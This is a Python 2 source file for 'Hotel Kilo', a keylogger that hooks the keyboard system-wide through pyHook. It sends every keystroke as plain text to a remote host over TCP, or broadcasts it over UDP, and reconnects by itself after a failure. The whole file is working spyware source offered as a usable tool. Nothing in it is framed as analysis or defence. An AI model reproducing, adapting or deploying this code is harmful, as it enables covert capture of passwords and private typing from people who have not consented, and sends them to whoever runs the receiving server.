# =================
#  Keyboard Hooker
# =================
import os
import sys
import socket
import pyHook
import pythoncom
from time import sleep

__version__ = '0.3'

# -- [ classes ] ---------------------------------------------------------------------------------
class HookerKilo():
    ''' Bad add network aware keyboard logger '''
    
    def __init__(self):
        ''' Setup hook manager, initial status and get thread id '''
        self.hooker = pyHook.HookManager() # Create hook manager
        self.status = False
        
    def __reconnect__(self, protocol):
        ''' Attempt to reconnect to server '''
        self.hooker.UnhookKeyboard() # Unhook keyboard
        self.status = False          # Lost connection
        if protocol == 'tcp':
            self.createTcpSocket('localhost') 
        elif protocol == 'udp':
            self.createBroadcastSocket()
        self.start()                 # Start hook again

    def start(self):
        ''' Start listening for keyboard events '''
        if self.status == 'tcp':
            self.hooker.KeyDown = self.sendKeyboardEvent
        elif self.status == 'udp':
            self.hooker.KeyDown = self.broadcastKeyboardEvent
        self.hooker.HookKeyboard() # Set the hook
        pythoncom.PumpMessages()   # Wait for events, WTF eclipse this works
        
    def createBroadcastSocket(self, port=2600):
        ''' Creates a Udp broadcast socket returns the object '''
        # Check to see if a connection has already been established
        if self.status != False:
            return
        self.udpSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.udpSocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        self.dest = '<broadcast>', port
        self.status = 'udp'

    def createTcpSocket(self, url, port=2600):
        ''' Creates a tcp socket using the file interface '''
        # Check to see if a connection has already been established
        if self.status != False:
            return 
        # Loops until a successful connection can be made
        while True:
            try:
                self.tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.tcpSocket.connect((url, port)) # Connect to the great server in the sky
                self.tcpFile = self.tcpSocket.makefile('rw', 0)
                sleep(2)              # Wait for connection to establish
                self.status = 'tcp'
                return                # Skip sleep(5)
            except socket.error, cause:
                print ' [!] Error: Unable to create tcp connection (%s)' % cause
                continue
            except:
                print '\n [OMFG] An epic fail occurred while attempting to create the socket!'
                os._exit(1)
            finally:
                sleep(5) # If connection fails, sleep for 5 seconds and retry

    def broadcastKeyboardEvent(self, event):
        ''' Sends the keystroke ascii value via UDP broadcast '''
        try:
            if int(event.Ascii) != 0:
                self.udpSocket.sendto(str(int(event.Ascii)), self.dest)
            else:
                self.udpSocket.sendto(str(event.Key), self.dest)
        except:
            self.__reconnect__('udp')
        return True

    def sendKeyboardEvent(self, event):
        ''' Sends the keystroke's ascii value to the remote server via tcp '''
        try:
            if int(event.Ascii) != 0:
                self.tcpFile.write(str(int(event.Ascii)))
            else:
                self.tcpFile.write(str(event.Key))
        except:
            self.__reconnect__('tcp')
        return True
    
    def setup(self, argv):
        ''' Sets up the network code based on a provided list '''
        if '--port' in argv:
            try:
                port = int(argv[argv.index('--port') + 1])
            except:
                print '\nError: %s is not a valid port, try again\n' % argv[argv.index('--port') + 1]
                os._exit(1)
        else:
            port = 2600 # Default port number
        if '--broadcast' in argv:
            self.createBroadcastSocket(port)
        elif '--remote-tcp' in argv:
            url = argv[argv.index('--remote-tcp') + 1]
            self.createTcpSocket(url, port)
        else:
            print '\nPEBKAC: You need to select a transmission mode'
            os._exit(1)

# -- [ main ] -------------------------------------------------------------------------------------
if __name__ == '__main__':
    def help():
        ''' Prints a helpful message to stdout '''
        print 'Hotel Kilo: Hooker.py - v%s' % __version__
        print 'Usage:\n\thooker [mode] [options]'
        print 'Mode:'
        print '\t--broadcast.......................Use plain text UDP broadcast'
        print '\t--remote-tcp [url/ip].............Use plain text TCP'
        print '\t--remote-ssl [url/ip].............Connect to server via SSL'
        print 'Options:'
        print '\t--base64..........................Decode data using base64'
        print '\t--port [number]...................Set port number'
        print '\t--create-conf.....................Create a configuration file'
        print '\t--help............................Display this message'
    if '--help' in sys.argv or '-h' in sys.argv:
        help()
    else:
        while True:
            try:
                hk = HookerKilo()
                hk.setup(sys.argv)
                hk.start()
            except IOError:
                pass
